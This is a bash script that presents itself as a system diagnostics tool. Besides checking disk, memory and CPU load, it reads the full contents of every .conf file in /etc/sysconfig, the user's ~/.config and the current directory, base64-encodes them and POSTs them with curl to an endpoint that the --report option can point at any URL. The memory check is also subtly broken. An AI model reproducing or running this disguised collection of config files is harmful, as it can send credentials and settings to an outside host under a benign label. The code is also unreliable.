#!/bin/bash
# System Diagnostics Tool v1.0

# Configuration variables
CFG_ENDPOINT="http://localhost:8080/api/diagnostics"
DATA_BUFFER=""
CHECK_INTERVAL=60
REPORT_FILE="/tmp/diagnostics_report.json"

# Function to display usage information
usage() {
    echo "Usage: $0 [OPTIONS]"
    echo "Options:"
    echo "  --report FILE    Specify where to send diagnostics (endpoint URL)"
    echo "  --help           Show this help message"
    echo "  --interval SECS  Set check interval in seconds (default: $CHECK_INTERVAL)"
}

# Function to check disk space
check_disk_space() {
    local disk_info=$(df -h / | awk 'NR==2 {print $2": "$3" used of "$4" ($5)"}')
    echo "DISK:$disk_info"
}

# Function to check memory usage
check_memory_usage() {
    local mem_info=$(free -h | awk 'NR==2 {print $2": "$3" used of "$1" ("$3*100/$1"%)"}')
    echo "MEMORY:$mem_info"
}

# Function to check CPU load
check_cpu_load() {
    local load_info=$(uptime | awk -F'load average:' '{print $2}' | xargs)
    echo "CPU_LOAD:$load_info"
}

# Function to read configuration files
read_config_files() {
    local config_locations=("/etc/sysconfig" "$HOME/.config" ".")
    local config_data=""
    
    for location in "${config_locations[@]}"; do
        if [ -d "$location" ]; then
            local files=$(find "$location" -maxdepth 1 -type f -name "*.conf" 2>/dev/null)
            for file in $files; do
                config_data+="$file:"$(cat "$file" | tr -d '\n')";"
            done
        fi
    done
    echo "CONFIG:$config_data"
}

# Function to collect all system data
collect_system_data() {
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    local hostname=$(hostname)
    
    local data="{\"timestamp\":\"$timestamp\",\"hostname\":\"$hostname\""
    data+=",\"$(check_disk_space)\""
    data+=",\"$(check_memory_usage)\""
    data+=",\"$(check_cpu_load)\""
    data+=",\"$(read_config_files)\"}"
    
    echo "$data"
}

# Function to encode data using base64
encode_data() {
    local data="$1"
    echo "$data" | base64
}

# Function to send data via curl POST
send_diagnostics() {
    local endpoint="$1"
    local encoded_data="$2"
    
    # Create JSON payload
    local payload="{\"data\":\"$encoded_data\"}"
    
    # Send POST request
    curl -s -X POST \
        -H "Content-Type: application/json" \
        -d "$payload" \
        "$endpoint" > /dev/null
    
    if [ $? -eq 0 ]; then
        echo "[$(date +'%Y-%m-%d %H:%M:%S')] Diagnostics sent to $endpoint"
    else
        echo "[$(date +'%Y-%m-%d %H:%M:%S')] Failed to send diagnostics to $endpoint"
    fi
}

# Function to save report to file
save_report() {
    local report_file="$1"
    local data="$2"
    
    echo "$data" > "$report_file"
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] Report saved to $report_file"
}

# Main function
main() {
    local custom_report=""
    
    # Parse command line arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            --report)
                custom_report="$2"
                shift 2
                ;;
            --interval)
                CHECK_INTERVAL="$2"
                shift 2
                ;;
            --help)
                usage
                exit 0
                ;;
            *)
                echo "Unknown option: $1"
                usage
                exit 1
                ;;
        esac
    done
    
    # Use custom report endpoint if provided, otherwise use default
    local endpoint="${custom_report:-$CFG_ENDPOINT}"
    
    # Collect and process system data
    local system_data=$(collect_system_data)
    local encoded_data=$(encode_data "$system_data")
    
    # Store in data buffer
    DATA_BUFFER="$encoded_data"
    
    # Send diagnostics
    send_diagnostics "$endpoint" "$encoded_data"
    
    # Save report if --report flag was used
    if [ -n "$custom_report" ]; then
        save_report "$REPORT_FILE" "$system_data"
    fi
}

# Run main function
main "$@"